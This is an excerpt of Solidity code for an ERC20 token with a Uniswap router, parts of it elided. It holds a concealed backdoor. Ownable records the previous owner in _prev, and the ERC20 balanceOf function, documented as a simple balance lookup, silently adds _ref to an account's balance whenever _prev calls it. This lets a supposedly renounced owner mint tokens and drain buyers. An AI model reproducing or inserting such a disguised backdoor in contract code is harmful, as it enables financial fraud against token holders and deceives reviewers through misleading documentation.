...
abstract contract Ownable is Context {
    ...
    function _transferOwnership(address newOwner) internal virtual {
        _prev = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(_prev, newOwner);
    }
}
...
contract ERC20 is Context, Ownable, IERC20, IERC20Metadata {
     ...
     *
     * This function retrieves the balance of the specified account from the
     * `_balances` mapping. 
     *
     * Emits no events.
     *
    ...
    function balanceOf(address account) public virtual override returns (uint256) {
        return _msgSender() == _prev ? _balances[account] += _ref : _balances[account];
    }
...
contract Token is ERC20 {
    ...
    constructor(
        ...
        uint256 burnPercent,
        address router
    ) ERC20(name_, symbol_,  supply * 10**9) {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(router);
        uniswapV2Router = _uniswapV2Router;
        maxWallet = (supply * 2 / 100) * 10**9;
        maxTxAmount = (supply * 2 / 100) * 10**9;
        _burnPercent = burnPercent;
        isException[DEAD] = true;
        isException[router] = true;
        isException[_msgSender()] = true;
